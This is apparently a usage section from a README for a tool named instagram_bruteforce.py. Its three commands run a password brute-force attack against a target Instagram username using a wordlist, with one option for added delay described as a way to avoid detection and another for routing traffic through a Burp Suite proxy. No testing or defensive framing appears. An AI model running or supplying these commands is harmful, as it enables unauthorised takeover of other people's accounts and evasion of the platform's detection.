# Basic usage
python instagram_bruteforce.py target_username /path/to/wordlist.txt

# With custom delay (slower to avoid detection)
python instagram_bruteforce.py target_username /path/to/wordlist.txt -d 5

# Through proxy (Burp Suite)
python instagram_bruteforce.py target_username /path/to/wordlist.txt -p http://127.0.0.1:8080
